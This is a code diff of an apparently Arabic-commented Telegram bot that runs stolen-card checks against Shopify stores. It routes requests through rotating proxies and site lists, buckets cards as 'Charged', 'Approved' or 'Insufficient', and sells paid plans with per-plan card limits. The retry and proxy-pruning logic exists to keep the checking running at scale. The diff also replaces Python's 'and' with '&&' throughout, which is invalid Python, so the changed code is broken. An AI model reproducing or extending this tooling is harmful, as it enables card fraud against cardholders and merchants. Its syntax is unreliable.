@@ -253,7 +253,7 @@ async def send_forced_gif(target_func, text, markup, url):
                 animation=media_to_send, caption=text, reply_markup=markup,
                 parse_mode=ParseMode.HTML, read_timeout=40, write_timeout=40
             )
-            if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
+            if url not in _GIF_FILE_IDS && getattr(msg, 'animation', None):
                 _GIF_FILE_IDS[url] = msg.animation.file_id
             return msg
         except RetryAfter as e:
@@ -280,7 +280,7 @@ async def send_forced_gif(target_func, text, markup, url):
     except Exception: pass
 
     try:
-        if hasattr(target_func, '__self__') and hasattr(target_func.__self__, 'reply_text'):
+        if hasattr(target_func, '__self__') && hasattr(target_func.__self__, 'reply_text'):
             return await target_func.__self__.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML)
     except: pass
     return None
@@ -347,7 +347,7 @@ def get_cc_limit(plan, uid=0):
     return 15
 
 def is_paid_plan(plan):
-    return plan and plan.lower() in [p.lower() for p in PAID_TIERS]
+    return plan && plan.lower() in [p.lower() for p in PAID_TIERS]
 
 _USER_HTTP_SESSIONS = {}
 async def get_user_http_session(uid):
@@ -360,7 +360,7 @@ async def get_user_http_session(uid):
 async def cleanup_user_http_session(uid):
     key = f"{uid}_msp"
     session = _USER_HTTP_SESSIONS.pop(key, None)
-    if session and not session.closed:
+    if session && not session.closed:
         try: await session.close()
         except Exception: pass
 
@@ -385,7 +385,7 @@ def parse_proxy_format(proxy):
     elif re.match(r'^([^:@]+):(\d+)$', proxy): h, p = re.match(r'^([^:@]+):(\d+)$', proxy).groups(); u = pw = ''
     else: return None
     if not h or not p: return None
-    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
+    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u && pw else f'{pt}://{h}:{p}'
     return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}
 
 _CACHED_SHOPIFY_SITES = []
@@ -394,7 +394,7 @@ _LAST_SITES_FETCH = 0
 async def get_shopify_sites():
     global _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
     now = time.time()
-    if _CACHED_SHOPIFY_SITES and (now - _LAST_SITES_FETCH < 600): return _CACHED_SHOPIFY_SITES
+    if _CACHED_SHOPIFY_SITES && (now - _LAST_SITES_FETCH < 600): return _CACHED_SHOPIFY_SITES
     try:
         async with aiohttp.ClientSession() as s:
             async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=10) as r:
@@ -402,7 +402,7 @@ async def get_shopify_sites():
                     _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).split('\n') if l.strip()]))
                     _LAST_SITES_FETCH = now
     except Exception: pass
-    if not _CACHED_SHOPIFY_SITES and os.path.exists('sites.txt'):
+    if not _CACHED_SHOPIFY_SITES && os.path.exists('sites.txt'):
         try:
             async with aiofiles.open('sites.txt', 'r', encoding='utf-8') as f:
                 _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).split('\n') if l.strip()]))
@@ -549,7 +549,7 @@ async def get_bin_info(bin_code, session=None):
 
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
-# دالة جلب رد الـ API الصافي وتمرير الموقع المستورد فوراً
+# دالة جلب رد الـ API بالترتيب الأصلي الموثوق وبدون استعجال
 async def check_shopify_api(api_url, card, site, proxy, session):
     try:
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
@@ -558,7 +558,6 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         
         card_encoded = quote(str(card).strip())
         
-        # أخذ الدومين القادم من ملف المواقع وتمريره كلياً للـ API
         site_param = site.strip()
         if not site_param.startswith("http"):
             site_param = f"https://{site_param}"
@@ -571,39 +570,39 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
         }
         
-        # [تعديل] تم رفع الـ Timeout إلى 40 ثانية كاملة كما طلبت
         async with session.get(req_url, headers=headers, timeout=40) as resp:
             text_data = await resp.text()
             
-            # محاولة قراءة الرد كـ JSON، وإذا لم يكن كذلك، نأخذ النص الخام بالكامل
             try: 
                 rj = json.loads(text_data)
-                rm = ""
-                # البحث عن رد الـ API في أي حقل مسترجع لإظهاره كما هو
-                for key in ['response_msg', 'result', 'Response', 'message', 'error', 'msg', 'status']:
-                    if key in rj and rj[key] is not None:
-                        rm = str(rj[key]).strip()
-                        break
-                if not rm:
-                    rm = text_data.strip()
+                # استخراج الرد مع إعطاء الأولوية القصوى لمفتاح response_msg للـ API الجديد
+                rm = str(rj.get('response_msg', rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', '')))))))).strip()
+                pr = rj.get('Price', rj.get('amount', "$10.00")) 
+                gt = rj.get('Gateway', 'Shopify')
             except Exception: 
                 rm = text_data.strip()
+                pr = "$10.00"
+                gt = "Shopify"
             
             rl = rm.lower()
             
-            # تصنيف الحالة بناءً على نص الرسالة الصافية المسترجعة
-            if any(k in rl for k in ['charged', 'completed', 'payment succeeded', 'success', 'succeeded']):
-                return {'status': 'Charged', 'message': rm, 'card': card}
-            if any(k in rl for k in ['insufficient', 'funds', 'balance', 'insufficient_funds']):
-                return {'status': 'Insufficient', 'message': rm, 'card': card}
-            if any(k in rl for k in ['3d', 'secure', 'otp', 'verification', 'challenge']):
-                return {'status': 'Approved', 'message': rm, 'card': card}
-            if any(k in rl for k in ['approved', 'invalid_cvv', 'match', 'cvv_mismatch', 'incorrect_cvc']): 
-                return {'status': 'Approved', 'message': rm, 'card': card}
+            # [إعادة الترتيب الأصلي بحذافيره] فحص الأخطاء أولاً لمنع الفرز الخاطئ كـ Approved
             if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare']):
-                return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True}
+                return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
                 
-            return {'status': 'Dead', 'message': rm, 'card': card}
+            if 'insufficient' in rl or 'funds' in rl or 'balance' in rl:
+                return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': gt, 'price': pr}
+                
+            if 'charged' in rl or 'completed' in rl or 'payment succeeded' in rl or 'success' in rl: 
+                return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': gt, 'price': pr}
+                
+            if '3d' in rl or 'secure' in rl or 'otp' in rl:
+                return {'status': 'Approved', 'message': '3d_secure_required', 'card': card, 'gateway': gt, 'price': pr}
+                
+            if 'approved' in rl or any(k in rl for k in ['invalid_cvv', 'match']): 
+                return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+                
+            return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
         
     except asyncio.TimeoutError:
         return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
@@ -620,7 +619,6 @@ async def remove_proxy_by_url(uid, proxy_url):
                     break
     except Exception: pass
 
-# دالة تمرير النتيجة الصافية القادمة من الـ API إلى البوت فورا بدون تعديل
 async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=3):
     lr = None
     for attempt in range(max_retries):
@@ -640,13 +638,33 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
         if gateway_name == "Shopify":
             r = await check_shopify_api(SHOPIFY_API_URL_1, card, s, p, session)
             status = r.get('status')
+            msg = str(r.get('message', '')).lower()
             
-            if status == 'Site Error' or r.get('retry'):
+            if any(k in msg for k in ['proxy', 'tunnel', 'connection close', 'format error', 'max retries', 'bad gateway', 'timeout']):
+                if p_dict:
+                    if p_dict in proxies:
+                        proxies.remove(p_dict)
+                    asyncio.create_task(remove_proxy_by_url(uid, p_dict['proxy_url']))
                 lr = r
                 continue
-            return r
+
+            if status == 'Rate Limit' or any(k in msg for k in ['429', '504', '405', 'gateway']):
+                await asyncio.sleep(random.uniform(1.0, 1.8))
+                lr = r
+                continue
+
+            if status == 'Site Error' or is_dead_site_error(msg):
+                _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
+                lr = r
+                continue
         else:
             return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
+        
+        if not r.get('retry'):
+            if status in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
+                _SITE_ERRORS_COUNT[s] = max(0, _SITE_ERRORS_COUNT.get(s, 0) - 1)
+            return r
+        lr = r
         
     if lr: return lr
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card}
@@ -1026,7 +1044,6 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
         except Exception: pass
 
-    # [أمر حصري للآدمن] جلب بوابات جيت هاب وفحصها فحصاً حقيقياً عبر البروكسيات وحذف التالف فوراً
     elif cmd == "checkgates":
         if uid not in ADMIN_ID: return
         tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Fetching gates from GitHub...')}</b>", use_gif=True)
